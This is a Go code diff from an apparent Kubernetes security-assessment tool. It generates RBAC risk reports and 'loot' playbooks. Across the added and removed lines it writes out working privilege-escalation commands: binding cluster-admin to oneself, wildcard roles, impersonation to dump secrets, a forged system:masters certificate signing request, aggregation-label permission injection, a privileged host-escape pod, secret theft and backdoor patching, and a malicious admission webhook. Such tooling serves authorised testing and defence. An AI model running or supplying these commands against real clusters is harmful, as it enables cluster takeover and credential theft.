-			lootCloudIAMSection.Addf("## ServiceAccount: %s/%s", ns, saName)
-			lootCloudIAMSection.Addf("Cloud IAM: %s", cloudRole)
-			lootCloudIAMSection.Addf("Active Pods: %d", podCount)
-			lootCloudIAMSection.AddBlank()
-			lootCloudIAMSection.Add("# Exploitation:")
-			lootCloudIAMSection.Addf("kubectl get pods -n %s -o json | jq '.items[] | select(.spec.serviceAccountName==\"%s\") | .metadata.name'", ns, saName)
-			lootCloudIAMSection.Addf("kubectl exec -it <pod-name> -n %s -- /bin/sh", ns)
-			lootCloudIAMSection.Add("# Inside pod:")
-			lootCloudIAMSection.Add("cat /var/run/secrets/kubernetes.io/serviceaccount/token")
-
-			if strings.HasPrefix(cloudRole, "AWS:") {
-				lootCloudIAMSection.Add("# For AWS IRSA:")
-				lootCloudIAMSection.Add("aws sts get-caller-identity")
-				lootCloudIAMSection.Add("aws s3 ls")
-			} else if strings.HasPrefix(cloudRole, "GCP:") {
-				lootCloudIAMSection.Add("# For GCP Workload Identity:")
-				lootCloudIAMSection.Add("gcloud auth list")
-				lootCloudIAMSection.Add("gcloud projects list")
-			} else if strings.HasPrefix(cloudRole, "Azure:") {
-				lootCloudIAMSection.Add("# For Azure Pod Identity:")
-				lootCloudIAMSection.Add("az account show")
-				lootCloudIAMSection.Add("az resource list")
-			}
-		}
-	}
-
-	if !hasCloudIAM {
-		lootCloudIAMSection.AddBlank()
-		lootCloudIAMSection.Add("# No ServiceAccounts with cloud IAM annotations detected")
-		lootCloudIAMSection.Add("# This is good - no K8s-to-Cloud privilege escalation paths")
-	}
-
-	// Build Risk Dashboard loot file
-	lootRiskDashboardSection := loot.Section("Risk-Dashboard").SetHeader(`#####################################
-##### Risk Statistics Dashboard
-#####################################
-#
-# Summary of dangerous permissions by risk level
-#`)
-
-	totalFindings := riskCounts.Total()
-	lootRiskDashboardSection.AddBlank()
-	lootRiskDashboardSection.Add("## Overall Statistics")
-	lootRiskDashboardSection.Addf("Total Findings: %d", totalFindings)
-	lootRiskDashboardSection.Addf("CRITICAL Risk: %d", riskCounts.Critical)
-	lootRiskDashboardSection.Addf("HIGH Risk:     %d", riskCounts.High)
-	lootRiskDashboardSection.Addf("MEDIUM Risk:   %d", riskCounts.Medium)
-	lootRiskDashboardSection.Addf("LOW Risk:      %d", riskCounts.Low)
-
-	lootRiskDashboardSection.AddBlank()
-	lootRiskDashboardSection.Add("## Attack Paths")
-	lootRiskDashboardSection.Addf("Total Attack Paths Identified: %d", len(attackPaths))
-
-	criticalPaths := 0
-	highPaths := 0
-	immediatePaths := 0
-	for _, path := range attackPaths {
-		if path.RiskLevel == shared.RiskCritical {
-			criticalPaths++
-		} else if path.RiskLevel == shared.RiskHigh {
-			highPaths++
-		}
-		if path.Feasibility == "Immediate" {
-			immediatePaths++
-		}
-	}
-	lootRiskDashboardSection.Addf("  CRITICAL: %d", criticalPaths)
-	lootRiskDashboardSection.Addf("  HIGH: %d", highPaths)
-	lootRiskDashboardSection.Addf("  Immediate Exploitation: %d", immediatePaths)
-
-	lootRiskDashboardSection.AddBlank()
-	lootRiskDashboardSection.Add("## Cloud IAM Integration")
-	cloudIAMCount := 0
-	for _, saMap := range serviceAccountCloudIAM {
-		cloudIAMCount += len(saMap)
-	}
-	lootRiskDashboardSection.Addf("ServiceAccounts with Cloud IAM: %d", cloudIAMCount)
-
-	defaultSACount := 0
-	wildcardCount := 0
-	for _, row := range tableRows {
-		if len(row) >= 9 {
-			flags := row[8]
-			if strings.Contains(flags, "DEFAULT-SA") {
-				defaultSACount++
-			}
-			if strings.Contains(flags, "WILDCARD") {
-				wildcardCount++
-			}
-		}
-	}
-	lootRiskDashboardSection.AddBlank()
-	lootRiskDashboardSection.Add("## Critical Misconfigurations")
-	lootRiskDashboardSection.Addf("Default ServiceAccounts with Elevated Permissions: %d", defaultSACount)
-	lootRiskDashboardSection.Addf("Wildcard ServiceAccount Group Bindings: %d", wildcardCount)
-
-	lootRiskDashboardSection.AddBlank()
-	lootRiskDashboardSection.Add("## Recommendations")
-	if riskCounts.Critical > 0 {
-		lootRiskDashboardSection.Addf("⚠️  URGENT: %d CRITICAL findings require immediate remediation", riskCounts.Critical)
-	}
-	if wildcardCount > 0 {
-		lootRiskDashboardSection.Addf("⚠️  URGENT: %d wildcard bindings grant excessive permissions", wildcardCount)
-	}
-	if defaultSACount > 0 {
-		lootRiskDashboardSection.Addf("⚠️  WARNING: %d default ServiceAccounts have elevated permissions", defaultSACount)
-	}
-	if cloudIAMCount > 0 {
-		lootRiskDashboardSection.Addf("ℹ️  INFO: %d ServiceAccounts have cloud IAM roles - ensure least privilege", cloudIAMCount)
-	}
-
-	lootEnumSection := loot.Section("Dangerous-Permissions-Enum").SetHeader(`#####################################
-##### Enumerate Dangerous Permissions
-#####################################
-`)
-
-	if globals.KubeContext != "" {
-		lootEnumSection.Addf("kubectl config use-context %s\n", globals.KubeContext)
-	}
-
-	lootEnumSection.Add(`
-# Check for system:masters membership
-kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects[]?.name == "system:masters")'
-kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.subjects[]?.name=="system:masters")'
-
-# Find impersonation rules
-kubectl get clusterroles -o json | jq '.items[] | select(.rules[]? | .verbs[]? | ascii_downcase == "impersonate")'
-kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]?.verbs[]?=="impersonate") | .metadata.name, .rules[]? | select(.verbs[]?=="impersonate")'
-
-# Find Role/ClusterRole creation permissions
-kubectl get clusterroles -o json | jq '.items[] | select(.rules[]? | (.verbs[]? | ascii_downcase == "create") and (.resources[]? | ascii_downcase | contains("role") ))'
-
-# Find ConfigMap and Secret modification permissions
-kubectl get clusterroles -o json | jq '.items[] | select(.rules[]? | (.verbs[]? | ascii_downcase == "create" or ascii_downcase == "update") and (.resources[]? | ascii_downcase | contains("secret") or contains("configmap") ))'
-
-# Check who can bind cluster-admin
-kubectl get clusterroles -o json | jq '.items[] | select(.metadata.name == "cluster-admin")'
-
-# Find cluster-admin bindings (Any subject (User, Group, ServiceAccount) bound to the cluster-admin role.)
-kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name=="cluster-admin") | .metadata.name, .subjects[]? | "\(.kind):\(.name) (ns=\(.namespace // "cluster-scope"))"'
-
-# Roles that can escalate privileges via RBAC editing
-kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]? | test("roles|clusterroles|rolebindings|clusterrolebindings"))) | .metadata.name, .rules[]'
-
-# Create/modify secrets
-kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]?=="secrets") and (.verbs[]? | test("create|update|patch|get"))) | .metadata.name'
-
-# Create/modify configmaps
-kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]?=="configmaps") and (.verbs[]? | test("create|update|patch"))) | .metadata.name'
-
-# Wildcard permissions - CRITICAL
-kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.verbs[]? == "*" or .resources[]? == "*")) | .metadata.name'
-
-# Pod execution permissions
-kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]? | test("pods/exec|pods/attach|pods/portforward")) and (.verbs[]? | test("create|get"))) | .metadata.name'
-
-# Admission webhook control - CRITICAL
-kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]? | test("validatingwebhookconfigurations|mutatingwebhookconfigurations")) and (.verbs[]? | test("create|update|patch"))) | .metadata.name'
-
-# Certificate approval - HIGH
-kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]? | test("certificatesigningrequests")) and (.verbs[]? | test("create|update|approve"))) | .metadata.name'
-
-# Node modification - HIGH
-kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.resources[]? | test("nodes")) and (.verbs[]? | test("create|update|patch|delete"))) | .metadata.name'
-
-# Namespace-Scoped Permissions
-
-# Namespace-level cluster-admin equivalents
-kubectl get rolebindings --all-namespaces -o json | jq -r '.items[] | select(.roleRef.name=="admin" or .roleRef.name=="cluster-admin") | "\(.metadata.namespace): \(.roleRef.name) -> \(.subjects[]?.kind):\(.subjects[]?.name)"'
-
-# Namespace-scoped RBAC modification
-kubectl get roles --all-namespaces -o json | jq -r '.items[] | select(.rules[]? | (.resources[]? | test("roles|rolebindings")) and (.verbs[]? | test("create|update|patch"))) | "\(.metadata.namespace): \(.metadata.name)"'
-
-# Namespace impersonation
-kubectl get roles --all-namespaces -o json | jq -r '.items[] | select(.rules[]? | (.verbs[]?=="impersonate")) | "\(.metadata.namespace): \(.metadata.name)"'
-
-# Create Pods with elevated privileges
-kubectl get roles --all-namespaces -o json | jq -r '.items[] | select(.rules[]? | (.resources[]?=="pods") and (.verbs[]? | test("create"))) | "\(.metadata.namespace): \(.metadata.name)"'
-
-`)
-
-	// Build exploitation techniques loot file
-	lootExploitsSection := loot.Section("Privilege-Escalation-Techniques").SetHeader(`#####################################
-##### Privilege Escalation Techniques
-#####################################
-#
-# MANUAL EXECUTION REQUIRED
-# Actionable exploitation techniques for discovered permissions
-#`)
-
-	if globals.KubeContext != "" {
-		lootExploitsSection.Addf("kubectl config use-context %s\n", globals.KubeContext)
-	}
-
-	lootExploitsSection.Add(`
+	// cluster-admin / system:masters
+	lootPlaybookSection.Add(`
 ##############################################
-## 1. RBAC Modification (Privilege Escalation)
+## CLUSTER-ADMIN / SYSTEM:MASTERS
 ##############################################
-# If you can create/update Roles, ClusterRoles, RoleBindings, or ClusterRoleBindings:
+# Full cluster control - no escalation needed`)
+	if len(permTracking.ClusterAdmin) > 0 {
+		lootPlaybookSection.Add("# Entities with this permission:")
+		for _, entity := range permTracking.ClusterAdmin {
+			lootPlaybookSection.Addf("#   - %s", entity)
+		}
+	} else {
+		lootPlaybookSection.Add("# No entities found with cluster-admin")
+	}
 
-# Grant yourself cluster-admin
-kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --user=<your-user>
-kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=<namespace>:<serviceaccount>
+	// RBAC Modification
+	lootPlaybookSection.Add(`
+##############################################
+## RBAC MODIFICATION
+##############################################
+# Can create/update roles and bindings`)
+	if len(permTracking.RBACModification) > 0 {
+		lootPlaybookSection.Add("# Entities with this permission:")
+		for _, entity := range permTracking.RBACModification {
+			lootPlaybookSection.Addf("#   - %s", entity)
+		}
+		lootPlaybookSection.Add(`
+# Escalate to cluster-admin:
+kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=NAMESPACE:SA_NAME
 
-# Create a custom high-privilege role
+# Or create custom role:
 cat <<EOF | kubectl apply -f -
 apiVersion: rbac.authorization.k8s.io/v1
 kind: ClusterRole
@@ -888,219 +869,118 @@ rules:
 - apiGroups: ["*"]
   resources: ["*"]
   verbs: ["*"]
----
-apiVersion: rbac.authorization.k8s.io/v1
-kind: ClusterRoleBinding
-metadata:
-  name: pwn-binding
-roleRef:
-  apiGroup: rbac.authorization.k8s.io
-  kind: ClusterRole
-  name: pwn-role
-subjects:
-- kind: User
-  name: <your-user>
-  apiGroup: rbac.authorization.k8s.io
-EOF
+EOF`)
+	} else {
+		lootPlaybookSection.Add("# No entities found with RBAC modification permissions")
+	}
 
+	// Impersonation
+	lootPlaybookSection.Add(`
 ##############################################
-## 2. Impersonation (Identity Theft)
+## IMPERSONATION
 ##############################################
-# If you can impersonate users, groups, or service accounts:
-
-# Test impersonation
+# Can impersonate users/groups/SAs`)
+	if len(permTracking.Impersonation) > 0 {
+		lootPlaybookSection.Add("# Entities with this permission:")
+		for _, entity := range permTracking.Impersonation {
+			lootPlaybookSection.Addf("#   - %s", entity)
+		}
+		lootPlaybookSection.Add(`
+# Test impersonation:
 kubectl auth can-i --list --as=system:serviceaccount:kube-system:default
-kubectl auth can-i --list --as=admin
 
-# Impersonate cluster-admin or high-privilege user
-kubectl --as=system:admin get secrets --all-namespaces
-kubectl --as=system:serviceaccount:kube-system:default get secrets -n kube-system
+# Impersonate and act:
+kubectl --as=system:serviceaccount:kube-system:default get secrets -A
+kubectl --as=cluster-admin create clusterrolebinding pwn --clusterrole=cluster-admin --user=YOUR_USER`)
+	} else {
+		lootPlaybookSection.Add("# No entities found with impersonation permissions")
+	}
 
-# Extract service account tokens by impersonating
-kubectl --as=system:serviceaccount:kube-system:admin create token admin -n kube-system --duration=24h
-
+	// Certificate Approval
+	lootPlaybookSection.Add(`
 ##############################################
-## 3. Pod Creation (Container Escape)
+## CERTIFICATE APPROVAL
 ##############################################
-# If you can create pods:
-
-# Create privileged pod for node escape
-cat <<EOF | kubectl apply -f -
-apiVersion: v1
-kind: Pod
-metadata:
-  name: pwn-pod
-  namespace: default
-spec:
-  hostNetwork: true
-  hostPID: true
-  hostIPC: true
-  containers:
-  - name: pwn
-    image: alpine:latest
-    securityContext:
-      privileged: true
-    volumeMounts:
-    - name: host
-      mountPath: /host
-    command: ["/bin/sh"]
-    args: ["-c", "sleep 3600"]
-  volumes:
-  - name: host
-    hostPath:
-      path: /
-      type: Directory
-EOF
-
-# Execute into the pod
-kubectl exec -it pwn-pod -- /bin/sh
-# Inside pod, escape to host:
-# chroot /host
-# Or use nsenter:
-# nsenter --target 1 --mount --uts --ipc --net --pid -- bash
-
-##############################################
-## 4. Secret Access (Credential Theft)
-##############################################
-# If you can read or modify secrets:
-
-# Extract all secrets
-kubectl get secrets --all-namespaces -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name): \(.data)"'
-
-# Decode specific secret
-kubectl get secret <secret-name> -n <namespace> -o jsonpath='{.data}' | jq -r 'to_entries[] | "\(.key)=\(.value | @base64d)"'
-
-# Extract service account tokens
-kubectl get secrets --all-namespaces -o json | jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") | "\(.metadata.namespace)/\(.metadata.name)"'
-
-# Modify secret to inject backdoor credentials
-kubectl patch secret <secret-name> -n <namespace> -p '{"data":{"password":"YmFja2Rvb3I="}}'
-
-##############################################
-## 5. Pod Execution (Runtime Access)
-##############################################
-# If you can use pods/exec, pods/attach, or pods/portforward:
-
-# Find pods to execute into
-kubectl get pods --all-namespaces -o wide
-
-# Execute into pod and steal secrets
-kubectl exec -it <pod-name> -n <namespace> -- /bin/sh
-# Inside pod:
-cat /var/run/secrets/kubernetes.io/serviceaccount/token
-cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-
-# Extract environment variables (may contain secrets)
-kubectl exec <pod-name> -n <namespace> -- env
-
-# Port forward to access internal services
-kubectl port-forward <pod-name> -n <namespace> 8080:80
-
-##############################################
-## 6. Admission Webhook Control (CRITICAL)
-##############################################
-# If you can create/modify ValidatingWebhookConfiguration or MutatingWebhookConfiguration:
-
-# Intercept ALL cluster API requests
-# WARNING: This can break the cluster if misconfigured
-cat <<EOF | kubectl apply -f -
-apiVersion: admissionregistration.k8s.io/v1
-kind: MutatingWebhookConfiguration
-metadata:
-  name: pwn-webhook
-webhooks:
-- name: pwn.example.com
-  clientConfig:
-    url: https://<your-webhook-server>/mutate
-  rules:
-  - operations: ["CREATE", "UPDATE"]
-    apiGroups: ["*"]
-    apiVersions: ["*"]
-    resources: ["*"]
-  admissionReviewVersions: ["v1"]
-  sideEffects: None
-EOF
-
-# This webhook can:
-# - Inject malicious containers into all pods
-# - Modify secrets before creation
-# - Bypass security policies
-# - Capture sensitive data from all API requests
-
-##############################################
-## 7. Certificate Approval (Auth Bypass)
-##############################################
-# If you can create or approve CertificateSigningRequests:
-
-# Create CSR for cluster-admin user
+# Can approve CSRs - create new cluster identities`)
+	if len(permTracking.CertificateApproval) > 0 {
+		lootPlaybookSection.Add("# Entities with this permission:")
+		for _, entity := range permTracking.CertificateApproval {
+			lootPlaybookSection.Addf("#   - %s", entity)
+		}
+		lootPlaybookSection.Add(`
+# Create and approve CSR for system:masters:
+openssl genrsa -out pwn.key 2048
+openssl req -new -key pwn.key -out pwn.csr -subj "/CN=pwn/O=system:masters"
 cat <<EOF | kubectl apply -f -
 apiVersion: certificates.k8s.io/v1
 kind: CertificateSigningRequest
 metadata:
   name: pwn-csr
 spec:
-  request: <base64-encoded-csr>
+  request: $(cat pwn.csr | base64 | tr -d '\n')
   signerName: kubernetes.io/kube-apiserver-client
-  usages:
-  - client auth
-  groups:
-  - system:masters
+  usages: ["client auth"]
 EOF
-
-# Approve the CSR
 kubectl certificate approve pwn-csr
+kubectl get csr pwn-csr -o jsonpath='{.status.certificate}' | base64 -d > pwn.crt`)
+	} else {
+		lootPlaybookSection.Add("# No entities found with certificate approval permissions")
+	}
 
-# Extract the certificate
-kubectl get csr pwn-csr -o jsonpath='{.status.certificate}' | base64 -d > pwn.crt
-
+	// Aggregation Roles
+	lootPlaybookSection.Add(`
 ##############################################
-## 8. Node Modification (Cluster Disruption)
+## RBAC AGGREGATION ROLES
 ##############################################
-# If you can modify nodes:
+# Uses RBAC aggregation - permissions can be dynamically expanded`)
+	if len(permTracking.AggregationRoles) > 0 {
+		lootPlaybookSection.Add("# Entities with this permission:")
+		for _, entity := range permTracking.AggregationRoles {
+			lootPlaybookSection.Addf("#   - %s", entity)
+		}
+		lootPlaybookSection.Add(`
+# Aggregation roles can have their permissions expanded by creating
+# new ClusterRoles with matching labels. If you can create ClusterRoles:
 
-# Taint node to evict all pods
-kubectl taint nodes <node-name> pwn=true:NoSchedule
+# Check aggregation selectors:
+kubectl get clusterrole ROLE_NAME -o yaml | grep -A10 aggregationRule
 
-# Drain node (evict all pods)
-kubectl drain <node-name> --ignore-daemonsets --delete-emptydir-data
+# Create ClusterRole that matches aggregation selector to inject permissions:
+cat <<EOF | kubectl apply -f -
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: inject-permissions
+  labels:
+    # Match the aggregation selector labels
+    rbac.authorization.k8s.io/aggregate-to-admin: "true"
+rules:
+- apiGroups: ["*"]
+  resources: ["*"]
+  verbs: ["*"]
+EOF`)
+	} else {
+		lootPlaybookSection.Add("# No aggregation roles found")
+	}
 
-# Modify node labels to bypass scheduling constraints
-kubectl label nodes <node-name> pwn=true
-
-##############################################
-## 9. Attack Path Chaining
-##############################################
-# Combine multiple permissions for maximum impact:
-
-# Chain 1: Pod Creation → Host Escape → Node Compromise
-# 1. Create privileged pod
-# 2. Mount host filesystem
-# 3. Chroot to host
-# 4. Modify kubelet config or steal node credentials
-
-# Chain 2: Secret Read → ServiceAccount Token → RBAC Escalation
-# 1. Read service account secrets
-# 2. Extract high-privilege SA token
-# 3. Use token to create cluster-admin binding
-# 4. Full cluster access
-
-# Chain 3: Impersonate → Create Role → Bind to Self
-# 1. Impersonate user with RBAC modification rights
-# 2. Create cluster-admin role binding for yourself
-# 3. Switch back to your identity with full access
-
-# Chain 4: ConfigMap Modify → Pod Environment → Credential Injection
-# 1. Modify ConfigMap used by pods
-# 2. Inject malicious environment variables
-# 3. Wait for pod restart or scale up
-# 4. Pods execute with backdoor credentials
-
-`)
 	// Output section
 	table := internal.TableFile{
 		Name:   "Hidden-Admins",
 		Header: headers,
 		Body:   tableRows,
+	}
+
+	// Hidden admin location table - shows where dangerous SAs are running
+	locationTable := internal.TableFile{
+		Name:   "Hidden-Admin-Location",
+		Header: []string{"Namespace", "ServiceAccount", "Permissions", "Cloud IAM", "Pod Name", "Node Name"},
+		Body:   locationRows,
+	}
+
+	// Build tables list
+	tables := []internal.TableFile{table}
+	if len(locationRows) > 0 {
+		tables = append(tables, locationTable)
 	}
 
 	// Build all loot files
@@ -1116,7 +996,7 @@ kubectl label nodes <node-name> pwn=true
 		globals.ClusterName,
 		"results",
 		HiddenAdminsOutput{
-			Table: []internal.TableFile{table},
+			Table: tables,
 			Loot:  lootFiles,
 		},
 	)
